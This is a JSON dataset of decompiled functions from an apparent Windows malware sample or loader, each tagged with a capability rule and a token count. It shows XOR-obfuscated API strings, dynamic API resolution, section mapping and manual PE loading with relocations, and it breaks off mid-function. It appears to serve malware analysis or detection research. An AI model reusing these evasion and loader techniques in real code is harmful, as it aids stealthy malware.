{
    "00401000": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401000(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    // [00] -r-x section size 61440 named .text\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x141c065d;\n    var_20h = 0x14161d5b;\n    var_1ch._0_2_ = 0x3714;\n    var_18h = 0x78787233;\n    var_14h._0_1_ = 0x37;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    iVar8 = 0;\n    var_8h = &var_24h - lpModuleName;\n    do {\n        puVar1 = iVar8 + lpModuleName;\n        iVar5 = iVar8 % 5;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_18h + iVar5) ^ puVar1[&var_24h - lpModuleName];\n    } while (iVar8 < 10);\n    var_24h = 0x3419431d;\n    var_20h = 0x1a532150;\n    var_1ch._0_2_ = 0x310b;\n    var_18h = 0x6675374f;\n    var_14h._0_1_ = 0x31;\n    uVar2 = (*pcVar3)(8, 0xb);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = lpModuleName;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar5;\n        iVar6 = iVar7 % var_4h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_18h + iVar6) ^ puVar1[&var_24h - iVar5];\n    } while (iVar7 < 10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*pcVar3)(var_10h);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*pcVar3)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 755
    },
    "004010fe": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004010fe(int32_t *arg_8h)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint *in_EDX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    var_38h = 0x141c065d;\n    puVar8 = &var_54h;\n    var_1ch = in_EDX;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_34h = 0x14161d5b;\n    puVar8 = &var_2ch;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    puVar8 = &var_24h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_30h = CONCAT22(var_30h._2_2_, 0x3714);\n    var_24h = 0x78787233;\n    var_20h._0_1_ = 0x37;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_10h = 5;\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + lpModuleName;\n        iVar6 = iVar5 % 5;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_38h - lpModuleName];\n    } while (iVar5 < 10);\n    var_3ch = 0x3a3b4d3b;\n    var_38h = 0x1d4d1400;\n    var_34h = 0x4d16001b;\n    var_30h = 0x750b2711;\n    var_24h = 0x48783975;\n    var_20h._0_1_ = 0x65;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        puVar1 = iVar6 + iVar5;\n        iVar7 = iVar6 % var_10h;\n        iVar6 = iVar6 + 1;\n        *puVar1 = *(&var_24h + iVar7) ^ puVar1[&var_3ch - iVar5];\n    } while (iVar6 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    var_48h = 0x40;\n    var_54h = 0x18;\n    var_50h = 0;\n    var_4ch = 0;\n    var_44h = 0;\n    var_40h = 0;\n    iVar6 = (*pcVar4)(&var_8h, 0xf001f, &var_54h, &var_2ch, 0x40, 0x8000000, 0);\n    if (iVar6 < 0) {\n        iVar6 = fcn.0040155d();\n    }\n    else {\n        iVar6 = fcn.00401411(&var_ch);\n        puVar9 = var_ch;\n        if (iVar6 == 0) {\n            for (; var_2ch != 0; var_2ch = var_2ch + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            *var_1ch = var_ch;\n            if (arg_8h != NULL) {\n                *arg_8h = var_8h;\n            }\n        }\n    }\n    if ((var_8h != 0) && (arg_8h == NULL)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar4 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, lpModuleName);\n    (*pcVar4)(uVar3);\n    return iVar6;\n}\n",
        "token_count": 1313
    },
    "004012b6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004012b6(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *in_ECX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uchar *in_EDX;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    iVar7 = *(in_EDX + iVar3 + 0x3c);\n    uVar6 = *(in_EDX + iVar3 + 6);\n    puVar13 = in_EDX;\n    puVar14 = in_ECX;\n    for (iVar9 = *(in_EDX + iVar3 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    if (uVar6 != 0) {\n        piVar12 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar10 = iVar7 + -1 + piVar12[-1] & ~(iVar7 - 1U);\n            if (uVar10 != 0) {\n                puVar13 = in_EDX + *piVar12;\n                puVar14 = in_ECX + piVar12[-2];\n                for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n            }\n            piVar12 = piVar12 + 10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    puVar13 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar13 = arg_8h;\n    }\n    iVar7 = 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar7 = 0xb0;\n    }\n    if ((*(in_EDX + iVar7 + iVar3) != 0) && (uVar6 = *(in_EDX + iVar7 + 4 + iVar3),  uVar6 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar9 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar9 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar14 = *(in_EDX + iVar3 + 0x30);\n        uVar10 = puVar13 - *(in_EDX + iVar3 + 0x30);\n        iVar4 = *(in_EDX + iVar3 + 0x34);\n        piVar12 = in_ECX + *(in_EDX + iVar7 + iVar3);\n        for (; 8 < uVar6; uVar6 = uVar6 - *piVar11) {\n            iVar3 = *piVar12;\n            uVar15 = piVar12[1] - 8U >> 1;\n            if ((piVar12[1] <= uVar6) && (uVar15 != 0)) {\n                piVar11 = piVar12 + 2;\n                do {\n                    uVar2 = *piVar11;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar3) = puVar13 + (*(in_ECX + (uVar2 & 0xfff) + iVar3) - iVar9);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar8 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar8 + iVar3;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar10;\n                        *(in_ECX + uVar8 + 4 + iVar3) =\n                             *(in_ECX + uVar8 + 4 + iVar3) + (((puVar13 >> 0x1f) - iVar4) - (puVar13 < puVar14)) +\n                             CARRY4(uVar5, uVar10);\n                    }\n                    piVar11 = piVar11 + 2;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            piVar11 = piVar12 + 1;\n            piVar12 = piVar12 + piVar12[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1190
    },
    "00401411": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401411(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_14h = 0;\n    puVar9 = &var_30h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_44h = 0x15340c79;\n    var_40h = 0x1d5e3138;\n    var_3ch = 0x342e3b0e;\n    var_38h = 0x1d0d1b52;\n    var_34h._0_2_ = 0x927;\n    var_34h._2_1_ = 0x37;\n    var_24h._0_2_ = 0x7837;\n    var_24h._2_2_ = 0x7479;\n    var_20h._0_2_ = 0x6748;\n    var_18h = in_EDX;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_8h = 6;\n    iVar5 = 0;\n    var_ch = &var_44h - var_10h;\n    do {\n        puVar1 = iVar5 + var_10h;\n        iVar6 = iVar5 % 6;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_24h + iVar6) ^ puVar1[&var_44h - var_10h];\n    } while (iVar5 < 0x13);\n    var_28h._0_1_ = 0x5d;\n    var_28h._1_1_ = 6;\n    var_28h._2_2_ = 0x141c;\n    var_24h._0_2_ = 0x1d5b;\n    var_24h._2_2_ = 0x1416;\n    var_20h._0_2_ = 0x3714;\n    var_8h = 0x78787233;\n    var_4h._0_1_ = 0x37;\n    uVar2 = (*pcVar3)(8, 0xb);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = var_10h;\n    iVar8 = 0;\n    do {\n        var_ch = 5;\n        puVar1 = iVar8 + iVar6;\n        iVar7 = iVar8 % 5;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_8h + iVar7) ^ puVar1[&var_28h - iVar6];\n    } while (iVar8 < 10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar6, var_10h);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    (*pcVar3)(var_1ch, var_18h, arg_8h, 0, 0, &var_30h, &var_14h, 2, 0, 0x40);\n    uVar2 = fcn.0040155d();\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*pcVar3)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 1074
    },
    "0040155d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040155d(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    ushort var_40h;\n    uint var_3eh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_28h;\n    uint var_22h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpModuleName;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_28h._0_1_ = 0x5d;\n    var_ch = 6;\n    var_28h._1_1_ = 6;\n    stack0xffffffd6 = 0x1d5b141c;\n    var_22h = 0x37141416;\n    var_1ch = 0x78787233;\n    var_18h._0_2_ = CONCAT11(var_18h._1_1_, 0x37);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpModuleName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    iVar8 = 0;\n    var_8h = &var_28h - lpModuleName;\n    do {\n        puVar1 = iVar8 + lpModuleName;\n        iVar5 = iVar8 % 5;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_1ch + iVar5) ^ puVar1[&var_28h - lpModuleName];\n    } while (iVar8 < 10);\n    var_3eh._0_1_ = 5;\n    var_40h = 0x202;\n    stack0xffffffbf = 0x24621637;\n    var_39h = 0x110c1d17;\n    var_35h._0_2_ = 0x3f65;\n    var_35h._2_1_ = 0x32;\n    var_35h._3_1_ = 6;\n    var_31h = 0x2243270a;\n    var_2dh._0_2_ = 0x1b19;\n    var_2dh._2_1_ = 0x79;\n    var_1ch = 0x79697650;\n    var_18h._0_2_ = 0x3162;\n    uVar2 = (*pcVar3)(8, 0x17);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = lpModuleName;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar5;\n        iVar6 = iVar7 % var_ch;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_1ch + iVar6) ^ puVar1[&var_40h - iVar5];\n    } while (iVar7 < 0x16);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar5);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*pcVar3)(var_14h);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*pcVar3)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 917
    },
    "0040168b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040168b(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0x141c065d;\n    var_20h = 0x14161d5b;\n    var_1ch._0_2_ = 0x3714;\n    var_18h = 0x78787233;\n    var_14h._0_1_ = 0x37;\n    var_10h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    iVar8 = 0;\n    var_8h = &var_24h - lpLibFileName;\n    do {\n        puVar1 = iVar8 + lpLibFileName;\n        iVar5 = iVar8 % 5;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_18h + iVar5) ^ puVar1[&var_24h - lpLibFileName];\n    } while (iVar8 < 10);\n    var_3ch = 0x5666312b;\n    var_38h = 0x65350425;\n    var_34h = 0xa122d51;\n    var_30h = 0x62d6b55;\n    var_2ch = 0x26575a31;\n    var_28h._0_1_ = 0x65;\n    var_18h = 0x38334565;\n    var_14h._0_1_ = 0x48;\n    uVar2 = (*pcVar3)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = lpLibFileName;\n    iVar7 = 0;\n    do {\n        puVar1 = iVar7 + iVar5;\n        iVar6 = iVar7 % var_4h;\n        iVar7 = iVar7 + 1;\n        *puVar1 = *(&var_18h + iVar6) ^ puVar1[&var_3ch - iVar5];\n    } while (iVar7 < 0x15);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    (*pcVar3)(0xffffffff, var_10h);\n    uVar2 = fcn.0040155d();\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*pcVar3)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 861
    },
    "00401c64": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401c64(uchar *param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41caa0 | *0x41caa4) == 0) || ((*0x41caa8 | *0x41caac) == 0)) || ((*0x41cab0 | *0x41cab4) == 0)) {\n        var_4h = 0x7f;\n        var_34h = 0x141c065d;\n        var_30h = 0x14161d5b;\n        var_2ch._0_2_ = 0x3714;\n        var_24h = 0x78787233;\n        var_20h._0_1_ = 0x37;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_8h = 5;\n        var_10h = iVar4;\n        iVar8 = 0;\n        var_1ch = &var_34h - iVar4;\n        do {\n            puVar1 = iVar8 + iVar4;\n            iVar5 = iVar8 % 5;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_34h - iVar4];\n        } while (iVar8 < 10);\n        var_ch = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4);\n        if (var_ch == 0) {\n            uVar3 = (*pcVar6)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            return var_4h;\n        }\n        var_34h = 0x1d280b23;\n        var_30h = 0x1e0b0e24;\n        var_2ch._0_2_ = 0x273d;\n        var_2ch._2_1_ = 0x6f;\n        var_24h = 0x515a6f6f;\n        var_20h._0_1_ = 0x4b;\n        uVar3 = (*pcVar6)(8, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        var_18h = iVar4;\n        var_1ch = &var_34h - iVar4;\n        do {\n            puVar1 = iVar8 + iVar4;\n            iVar5 = iVar8 % var_8h;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_34h - iVar4];\n        } while (iVar8 < 0xb);\n        *0x41caa0 = fcn.0040e3f5();\n        iVar8 = var_10h;\n        *0x41caa4 = *0x41caa0 >> 0x1f;\n        if ((*0x41caa0 | *0x41caa4) == 0) {\n            uVar3 = (*pcVar6)(0, iVar4);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar6)(0, iVar8);\n            (*pcVar2)(uVar3);\n            return var_4h;\n        }\n        var_4ch = 0x723e531c;\n        var_48h = 0x3e672452;\n        var_44h = 0x5335545a;\n        var_40h = 0x11524739;\n        var_3ch = 0x52472853;\n        var_38h._0_2_ = 0x4423;\n        var_38h._2_1_ = 0x4c;\n        var_24h = 0x354c3750;\n        var_20h._0_1_ = 0x37;\n        uVar3 = (*pcVar6)(8, 0x18);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + var_14h;\n            iVar8 = iVar4 % var_8h;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_24h + iVar8) ^ puVar1[&var_4ch - var_14h];\n        } while (iVar4 < 0x17);\n        *0x41caa8 = fcn.0040e3f5();\n        iVar8 = var_10h;\n        iVar4 = var_18h;\n        *0x41caac = *0x41caa8 >> 0x1f;\n        if ((*0x41caa8 | *0x41caac) == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_4ch = 0x3322336e;\n            var_48h = 0x1121402d;\n            var_44h = 0x365d1435;\n            var_40h = 0x58233406;\n            var_3ch = 0x2d2c1709;\n            var_38h._0_2_ = 0x3d46;\n            var_38h._2_1_ = 0x72;\n            var_30h = 0x41724434;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x42);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + var_1ch;\n                iVar8 = iVar4 % var_8h;\n                iVar4 = iVar4 + 1;\n                *puVar1 = *(&var_30h + iVar8) ^ puVar1[&var_4ch - var_1ch];\n            } while (iVar4 < 0x17);\n            *0x41cab0 = fcn.0040e3f5();\n            iVar8 = var_10h;\n            iVar4 = var_18h;\n            *0x41cab4 = *0x41cab0 >> 0x1f;\n            if ((*0x41cab0 | *0x41cab4) != 0) {\n                var_4h = 0;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n                (*pcVar6)(uVar3);\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*pcVar6)(uVar3);\n                uVar3 = (*pcVar2)(0, iVar8);\n                (*pcVar6)(uVar3);\n                goto code_r0x00401f61;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        }\n        (*pcVar6)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar6)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar8);\n        (*pcVar6)(uVar3);\n    }\n    else {\ncode_r0x00401f61:\n        puVar7 = 0x41caa0;\n        for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *var_28h = *puVar7;\n            puVar7 = puVar7 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 2224
    },
    "00401f77": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401f77(uchar *param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    int32_t iVar9;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_4h = 0;\n    var_28h = param_1;\n    if ((((*0x41cab8 | *0x41cabc) == 0) || ((*0x41cac0 | *0x41cac4) == 0)) || ((*0x41cac8 | *0x41cacc) == 0)) {\n        var_4h = 0x7f;\n        var_34h = 0x141c065d;\n        var_30h = 0x14161d5b;\n        var_2ch._0_2_ = 0x3714;\n        var_24h = 0x78787233;\n        var_20h._0_1_ = 0x37;\n        var_10h = param_2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_8h = 5;\n        iVar9 = 0;\n        var_1ch = &var_34h - var_ch;\n        do {\n            puVar1 = iVar9 + var_ch;\n            iVar4 = iVar9 % 5;\n            iVar9 = iVar9 + 1;\n            *puVar1 = *(&var_24h + iVar4) ^ puVar1[&var_34h - var_ch];\n        } while (iVar9 < 10);\n        var_34h = 0x1d280b23;\n        var_30h = 0x1e0b0e24;\n        var_2ch._0_2_ = 0x273d;\n        var_2ch._2_1_ = 0x6f;\n        var_24h = 0x515a6f6f;\n        var_20h._0_1_ = 0x4b;\n        uVar3 = (*pcVar6)(8, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar9 = var_ch;\n        iVar7 = 0;\n        var_18h = iVar4;\n        var_1ch = &var_34h - iVar4;\n        do {\n            puVar1 = iVar7 + iVar4;\n            iVar5 = iVar7 % var_8h;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_24h + iVar5) ^ puVar1[&var_34h - iVar4];\n        } while (iVar7 < 0xb);\n        *0x41cab8 = 